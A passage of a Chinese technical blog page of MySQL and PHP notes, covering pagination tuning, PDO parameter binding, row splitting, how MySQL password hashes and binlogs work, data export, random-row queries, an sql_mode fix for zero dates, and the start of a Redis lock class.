| ref  | rows | filtered | Extra       |</span><br><span class="line">+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br><span class="line">|  <span class="number">1</span> | SIMPLE      | range_partition_test | p2,p3      | ALL  | NULL          | NULL | NULL    | NULL |    <span class="number">2</span> |    <span class="number">50.00</span> | Using where |</span><br><span class="line">+----+-------------+----------------------+------------+------+---------------+------+---------+------+------+----------+-------------+</span><br></pre></td></tr></table></figure>
<h3 id="limit优化"><a href="#limit优化" class="headerlink" title="limit优化"></a>limit优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">MySQL的 limit m,n 工作原理就是先读取符合where条件的前面m+n条记录，然后抛弃前m条，返回后面n条，所以m越大，偏移量越大，性能就越差。这也是大部分ORM框架生成的分页sql</span><br><span class="line"></span><br><span class="line">SELECT * FROM</span><br><span class="line"> t_tel_record t1</span><br><span class="line">INNER JOIN (</span><br><span class="line"> SELECT f_id</span><br><span class="line"> FROM t_tel_record</span><br><span class="line"> WHERE f_qiye_id = xxx</span><br><span class="line"> ORDER BY f_id DESC</span><br><span class="line"> LIMIT <span class="number">999900</span>, <span class="number">100</span></span><br><span class="line">) t2 ON t1.f_id = t2.f_id</span><br><span class="line"></span><br><span class="line">min_id = SELECT f_id</span><br><span class="line">FROM t_tel_record</span><br><span class="line">WHERE f_qiye_id = xxx</span><br><span class="line">ORDER BY f_id DESC</span><br><span class="line">LIMIT <span class="number">999900</span>, <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SELECT * FROM</span><br><span class="line">  t_tel_record t1</span><br><span class="line">WHERE f_qiye_id = xxx</span><br><span class="line">AND f_id &lt; &#123;min_id&#125; + <span class="number">1</span></span><br><span class="line">ORDER BY f_id DESC</span><br><span class="line">LIMIT <span class="number">100</span></span><br><span class="line">第一页：（降序）</span><br><span class="line">SELECT * FROM t_tel_record t1</span><br><span class="line">WHERE f_qiye_id = xxx</span><br><span class="line">ORDER BY f_id DESC LIMIT <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">获取结果集最大最小id：一般是第一条和最后一条，或者 max_id=max(f_id), min_id=min(f_id)</span><br><span class="line">下一页（如果有）：</span><br><span class="line">SELECT * FROM t_tel_record t1</span><br><span class="line">WHERE f_qiye_id = xxx</span><br><span class="line">AND f_id &lt; &#123;min_id&#125;  -- min_id变量</span><br><span class="line">ORDER BY f_id DESC LIMIT <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">上一页（如果有）：</span><br><span class="line">SELECT * FROM t_tel_record t1</span><br><span class="line">WHERE f_qiye_id = xxx</span><br><span class="line">AND f_id &gt; &#123;max_id&#125;  -- max_id变量</span><br><span class="line">ORDER BY f_id DESC LIMIT <span class="number">100</span></span><br><span class="line">最后一页：（降序）</span><br><span class="line">SELECT * FROM (</span><br><span class="line">  SELECT * FROM t_tel_record t1</span><br><span class="line">  WHERE f_qiye_id = xxx</span><br><span class="line">  ORDER BY f_id ASC LIMIT <span class="number">100</span>) AS t</span><br><span class="line">ORDER BY f_id DESC</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">倒数第二页：(以此类推)</span><br><span class="line">SELECT * FROM (</span><br><span class="line">  SELECT * FROM t_tel_record t1</span><br><span class="line">  WHERE f_qiye_id = xxx</span><br><span class="line">  ORDER BY f_id ASC LIMIT <span class="number">100</span>, <span class="number">100</span>) AS t</span><br><span class="line">ORDER BY f_id DESC</span><br></pre></td></tr></table></figure>
<h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-- 将 oldUsers 表中的数据插入到 users 表</span><br><span class="line">INSERT INTO <span class="string">`users`</span>(<span class="string">`email`</span>, <span class="string">`name`</span>, <span class="string">`password`</span>) SELECT <span class="string">`email`</span>, <span class="string">`name`</span>, <span class="string">`password`</span> FROM <span class="string">`oldUsers`</span>;</span><br><span class="line"></span><br><span class="line">-- 将 users 表的数据复制到 usersCopy 表</span><br><span class="line">SELECT * INTO <span class="string">`usersCopy`</span> FROM <span class="string">`users`</span>;</span><br><span class="line"></span><br><span class="line">-- 创建新表 usersCopy 并将 users 复制过去</span><br><span class="line">CREATE TABLE <span class="string">`usersCopy`</span> AS SELECT * FROM <span class="string">`users`</span>;</span><br><span class="line">-- 查询 products 表中 price 与 number 的乘积并设为别名 total</span><br><span class="line">SELECT <span class="string">`price`</span> * <span class="string">`number`</span> AS <span class="string">`total`</span> FROM <span class="string">`products`</span>;</span><br><span class="line">-- 查询 users 表中的 name 列并将其用括号括起而且设置列别名为 newName</span><br><span class="line">SELECT Concat(<span class="string">'('</span>, <span class="string">`name`</span>, <span class="string">')'</span>) AS <span class="string">`newName`</span> FROM <span class="string">`users`</span>;</span><br></pre></td></tr></table></figure>
<h3 id="bindParam-和-bindValue"><a href="#bindParam-和-bindValue" class="headerlink" title="bindParam 和 bindValue"></a>bindParam 和 bindValue</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bindParam 的作用是将变量的引用绑定到预编译的 SQL 语句中，当绑定的变量值改变时 SQL 语句随之改变。</span><br><span class="line"></span><br><span class="line">$statement = $pdo-&gt;prepare(<span class="string">"INSERT INTO `posts` (`id`, `title`, `author`) VALUES (:id, :title, :author)"</span>);</span><br><span class="line">$id = <span class="number">11</span>;</span><br><span class="line">$title = <span class="string">'new post'</span>;</span><br><span class="line">$author = <span class="string">'unknown'</span>;</span><br><span class="line">$statement-&gt;bindParam(<span class="string">':id'</span>, $id, <span class="attr">PDO</span>::PARAM_INT);</span><br><span class="line">$statement-&gt;bindParam(<span class="string">':title'</span>, $title, <span class="attr">PDO</span>::PARAM_STR);</span><br><span class="line">$statement-&gt;bindParam(<span class="string">':author'</span>, $author, <span class="attr">PDO</span>::PARAM_STR);</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line">$id = <span class="number">12</span>;</span><br><span class="line">$title = <span class="string">'new post2'</span>;</span><br><span class="line">$author = <span class="string">'unknown2'</span>;</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line"><span class="comment">// 执行代码后查询数据库显示如下</span></span><br><span class="line"><span class="comment">// +----+-----------+----------+</span></span><br><span class="line"><span class="comment">// | id | title     | author   |</span></span><br><span class="line"><span class="comment">// +----+-----------+----------+</span></span><br><span class="line"><span class="comment">// |  1 | new post  | unknown  |</span></span><br><span class="line"><span class="comment">// |  2 | new post2 | unknown2 |</span></span><br><span class="line"><span class="comment">// +----+-----------+----------+</span></span><br><span class="line">警告：由于 bindParam 是绑定的是变量的引用，所以在 foreach 中会出现意料之外的 BUG。示例如下：</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">':title'</span> =&gt; <span class="string">'title'</span>, <span class="string">':author'</span> =&gt; <span class="string">'author'</span>];</span><br><span class="line">$statement = $pdo-&gt;prepare(<span class="string">"INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)"</span>);</span><br><span class="line">foreach ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    $statement-&gt;bindParam($key, $val);</span><br><span class="line">&#125;</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line"><span class="comment">// 执行代码后查询数据库显示如下</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// | id | title  | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// |  1 | author | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line">当循环结束后 $val 的值即为数组中最后一个元素的值，而 bindParam 方法绑定的是引用而不是值，所以此时所有的占位符绑定的都是循环结束后的 $val 变量值，因此就有了这个结果。 解决这个问题我们可以用 bindValue 方法实现。</span><br><span class="line"></span><br><span class="line">bindValue 的作用是绑定值到预编译的 SQL 语句中，一经绑定 SQL 语句就固定不变。示例如下：</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">':title'</span> =&gt; <span class="string">'title'</span>, <span class="string">':author'</span> =&gt; <span class="string">'author'</span>];</span><br><span class="line">$statement = $pdo-&gt;prepare(<span class="string">"INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)"</span>);</span><br><span class="line">foreach ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    $statement-&gt;bindValue($key, $val);</span><br><span class="line">&#125;</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line"><span class="comment">// 执行代码后查询数据库显示如下</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// | id | title  | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// |  1 | title  | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line">这样就解决了这个问题，当然我们还可以在 foreach 中使用引用的方式解决这个问题，但是不推荐。示例如下：</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">':title'</span> =&gt; <span class="string">'title'</span>, <span class="string">':author'</span> =&gt; <span class="string">'author'</span>];</span><br><span class="line">$statement = $pdo-&gt;prepare(<span class="string">"INSERT INTO `posts` (`title`, `author`) VALUES (:title, :author)"</span>);</span><br><span class="line">foreach ($data <span class="keyword">as</span> $key =&gt; &amp;$val) &#123;</span><br><span class="line">    $statement-&gt;bindParam($key, $val);</span><br><span class="line">&#125;</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line"><span class="comment">// 执行代码后查询数据库显示如下</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// | id | title  | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br><span class="line"><span class="comment">// |  1 | title  | author |</span></span><br><span class="line"><span class="comment">// +----+--------+--------+</span></span><br></pre></td></tr></table></figure>
<h3 id="行列转换"><a href="#行列转换" class="headerlink" title="行列转换"></a>行列转换</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#准备示例数据</span><br><span class="line">create table tbl_name (ID int ,mSize varchar(<span class="number">100</span>));</span><br><span class="line">insert into tbl_name values (<span class="number">1</span>,<span class="string">'tiny,small,big'</span>);</span><br><span class="line">insert into tbl_name values (<span class="number">2</span>,<span class="string">'small,medium'</span>);</span><br><span class="line">insert into tbl_name values (<span class="number">3</span>,<span class="string">'tiny,big'</span>);</span><br><span class="line"></span><br><span class="line">#用于行列转换循环的自增表</span><br><span class="line">create table incre_table (AutoIncreID int);</span><br><span class="line">insert into incre_table values (<span class="number">1</span>);</span><br><span class="line">insert into incre_table values (<span class="number">2</span>);</span><br><span class="line">insert into incre_table values (<span class="number">3</span>);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">#实现行列转换的SQLhttp://cenalulu.github.io/mysql/column-row-reverse/</span><br><span class="line">select a.ID,substring_index(substring_index(a.mSize,<span class="string">','</span>,b.AutoIncreID),<span class="string">','</span>,<span class="number">-1</span>) </span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">tbl_name a</span><br><span class="line">join</span><br><span class="line">incre_table b</span><br><span class="line">on b.AutoIncreID &lt;= (length(a.mSize) - length(replace(a.mSize,<span class="string">','</span>,<span class="string">''</span>))+<span class="number">1</span>)</span><br><span class="line">order by a.ID;</span><br><span class="line">select a.ID,substring_index(substring_index(a.mSize,<span class="string">','</span>,b.help_topic_id+<span class="number">1</span>),<span class="string">','</span>,<span class="number">-1</span>) </span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line">tbl_name a</span><br><span class="line">join</span><br><span class="line">mysql.help_topic b</span><br><span class="line">on b.help_topic_id &lt; (length(a.mSize) - length(replace(a.mSize,<span class="string">','</span>,<span class="string">''</span>))+<span class="number">1</span>)</span><br><span class="line">order by a.ID;</span><br></pre></td></tr></table></figure>
<h3 id="MySQL密码"><a href="#MySQL密码" class="headerlink" title="MySQL密码"></a>MySQL密码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password(<span class="string">'root'</span>),concat(<span class="string">'*'</span>,sha1(unhex(sha1(<span class="string">'root'</span>))));</span><br><span class="line">+-------------------------------------------+-------------------------------------------+</span><br><span class="line">| password(<span class="string">'root'</span>)                          | concat(<span class="string">'*'</span>,sha1(unhex(sha1(<span class="string">'root'</span>))))     |</span><br><span class="line">+-------------------------------------------+-------------------------------------------+</span><br><span class="line">| *<span class="number">81</span>F5E21E35407D884A6CD4A731AEBFB6AF209E1B | *<span class="number">81</span>f5e21e35407d884a6cd4a731aebfb6af209e1b |</span><br><span class="line">+-------------------------------------------+-------------------------------------------+</span><br><span class="line"><span class="number">5.6</span>以前如果你向MySQL发送了例如create user,grant user ... identified by这样的携带初始明文密码的指令，那么会在binary log中原原本本的被还原出来。</span><br><span class="line">mysql [localhost] &#123;msandbox&#125; (mysql) &gt; create user plain_password identified by <span class="string">'plain_pass'</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected (<span class="number">0.00</span> sec)</span><br><span class="line">用mysqlbinlog查看二进制日志 http:<span class="comment">//cenalulu.github.io/mysql/myall-about-mysql-password/</span></span><br><span class="line"></span><br><span class="line">shell&gt; mysqlbinlog binlog<span class="number">.000001</span></span><br><span class="line"># at 106</span><br><span class="line">#150227 23:37:59 server id 1  end_log_pos 223   Query   thread_id=1 exec_time=0 error_code=0</span><br><span class="line">use mysql<span class="comment">/*!*/</span>;</span><br><span class="line">SET TIMESTAMP=<span class="number">1425051479</span><span class="comment">/*!*/</span>;</span><br><span class="line">SET @@session.pseudo_thread_id=<span class="number">1</span><span class="comment">/*!*/</span>;</span><br><span class="line"></span><br><span class="line">change master to master_password=<span class="string">''</span>命令不在这个范畴中。这也就意味着MySQL5<span class="number">.6</span>中仍然使用这样的语法来启动replication时有安全风险的。这也就是为什么<span class="number">5.6</span>中使用带有明文密码的change master to时会有warning提示，具体如下：</span><br><span class="line"></span><br><span class="line">slave1 [localhost] &#123;msandbox&#125; ((none)) &gt; change master to master_host=<span class="string">'127.0.0.1'</span>,master_port =<span class="number">21288</span>,master_user=<span class="string">'rsandbox'</span>,master_password=<span class="string">'rsandbox'</span>,master_auto_position=<span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> rows affected, <span class="number">2</span> warnings (<span class="number">0.04</span> sec)</span><br><span class="line"></span><br><span class="line">slave1 [localhost] &#123;msandbox&#125; ((none)) &gt; show warnings;</span><br><span class="line">+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Level | Code | Message                                                                                                                                                                                                                                                                              |</span><br><span class="line">+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Note  | <span class="number">1759</span> | Sending passwords <span class="keyword">in</span> plain text without SSL/TLS is extremely insecure.                                                                                                                                                                                                               |</span><br><span class="line">| Note  | <span class="number">1760</span> | Storing MySQL user name or password information <span class="keyword">in</span> the master info repository is not secure and is therefore not recommended. Please consider using the USER and PASSWORD connection options <span class="keyword">for</span> START SLAVE; see the <span class="string">'START SLAVE Syntax'</span> <span class="keyword">in</span> the MySQL Manual <span class="keyword">for</span> more information. |</span><br><span class="line">+-------+------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="导出表数据"><a href="#导出表数据" class="headerlink" title="导出表数据"></a>导出表数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> table into outfile <span class="string">"/home/root/example.sql"</span> where +条件</span><br><span class="line">导入数据库</span><br><span class="line"></span><br><span class="line">$ mysqldump -uroot -p --<span class="keyword">default</span>-character-set=utf8 dbname tablename &gt;  <span class="regexp">/home/</span>root/example.sql</span><br><span class="line">转载数据</span><br><span class="line"></span><br><span class="line">load data local infile <span class="string">"/home/table.txt"</span> into table <span class="string">`table`</span>;</span><br></pre></td></tr></table></figure>
<h3 id="从数据库中获取随机的数据"><a href="#从数据库中获取随机的数据" class="headerlink" title="从数据库中获取随机的数据"></a>从数据库中获取随机的数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">User::inRandomOrder()-&gt;get();</span><br><span class="line">User::inRandomOrder()-&gt;first();</span><br><span class="line">User::orderByRaw(<span class="string">"RAND()"</span>)-&gt;get();</span><br><span class="line">use Illuminate\Database\Query\Builder;</span><br><span class="line"><span class="comment">//https://learnku.com/laravel/wikis/16199</span></span><br><span class="line">Builder::macro(<span class="string">'orderByRandom'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $randomFunctions = [</span><br><span class="line">        <span class="string">'mysql'</span>  =&gt; <span class="string">'RAND()'</span>,</span><br><span class="line">        <span class="string">'pgsql'</span>  =&gt; <span class="string">'RANDOM()'</span>,</span><br><span class="line">        <span class="string">'sqlite'</span> =&gt; <span class="string">'RANDOM()'</span>,</span><br><span class="line">        <span class="string">'sqlsrv'</span> =&gt; <span class="string">'NEWID()'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $driver = $<span class="keyword">this</span>-&gt;getConnection()-&gt;getDriverName();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;orderByRaw($randomFunctions[$driver]);</span><br><span class="line">&#125;);</span><br><span class="line">SELECT </span><br><span class="line">FROM table AS t1 JOIN (SELECT ROUND(RAND() ((SELECT MAX(id) FROM table)-(SELECT MIN(id) FROM table))+(SELECT MIN(id) FROM table)) AS id) AS t2</span><br><span class="line">WHERE t1.id &gt;= t2.id</span><br><span class="line">ORDER BY t1.id LIMIT <span class="number">1</span>;</span><br><span class="line">以前用过的，效率不错。</span><br></pre></td></tr></table></figure>
<h3 id="mysql5-7-datetime-默认值为‘0000-00-00-00-00-00’值无法创建问题解决"><a href="#mysql5-7-datetime-默认值为‘0000-00-00-00-00-00’值无法创建问题解决" class="headerlink" title="mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建问题解决"></a>mysql5.7 datetime 默认值为‘0000-00-00 00:00:00’值无法创建问题解决</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、使用root登陆数据库 命令界面执行</span><br><span class="line"></span><br><span class="line">select @@sql_mode;</span><br><span class="line"> 结果中包含下面两个</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE</span><br><span class="line"><span class="number">2</span>、修改/etc/my.cnf，查找sql_model如果找不到则添加如下代码 </span><br><span class="line"></span><br><span class="line">sql_mode=<span class="string">"ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"</span></span><br><span class="line"><span class="number">3</span>、重启mysql</span><br><span class="line"></span><br><span class="line">/etc/ini.d/mysql restart</span><br><span class="line">简单几步大功告成！</span><br><span class="line"></span><br><span class="line"> http:<span class="comment">//118.25.60.91:9080/article/15 https://learnku.com/articles/16807</span></span><br><span class="line"></span><br><span class="line">原因：</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE,NO_ZERO_DATE是无法默认为‘<span class="number">0000</span><span class="number">-00</span><span class="number">-00</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>’的根源。</span><br><span class="line"></span><br><span class="line">NO_ZERO_IN_DATE：在严格模式下，不允许日期和月份为零 </span><br><span class="line"></span><br><span class="line">NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</span><br></pre></td></tr></table></figure>
<h3 id="Redis-分布式锁"><a href="#Redis-分布式锁" class="headerlink" title="Redis 分布式锁"></a>Redis 分布式锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * redis 加锁 --单Redis实例实现分布式锁</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- 分布式请使用：Redlock:https://github.com/ronnylt/redlock-php</span></span><br><span class="line"><span class="comment"> * -- 详情参考： http://www.redis.cn/topics/distlock.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @package app\common\service</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> LOCK_SUCCESS = <span class="string">'OK'</span>;</span><br><span class="line">    <span class="keyword">const</span> IF_NOT_EXISTS = <span class="string">'NX'</span>;</span><br><span class="line">    <span class="keyword">const</span> MILLISECOND_EXPIRE_TIME = <span class="string">'PX'</span>;</span><br><span class="line">    <span class="keyword">const</span> EXPIRE_TIME = <span class="number">60000</span>; <span class="comment">// millisecond =&gt; 60s</span></span><br><span class="line">    <span class="keyword">const</span> LOCK_VALUE = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 加锁https://learnku.com/articles/15825/redis-distributed-lock-solution</span></span><br><span class="line"><span class="comment">         * @param $redis object</span></span><br><span class="line"><span class="comment">         * @param $key</span></span><br><span class="line"><span class="comment">         * @param string $expire_time 60000</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">lock</span>(<span class="params">$redis, $key, $expire_time=<span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (empty($expire_time)) &#123;</span><br><span class="line">                    $expire_time = self::EXPIRE_TIME;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $result = $redis-&gt;set($key, <span class="attr">self</span>::LOCK_VALUE, [self::IF_NOT_EXISTS, <span class="attr">self</span>::<span class="function"><span class="params">MILLISECOND_EXPIRE_TIME</span> =&gt;</span> $expire_time]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> self::LOCK_SUCCESS === (string)$result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         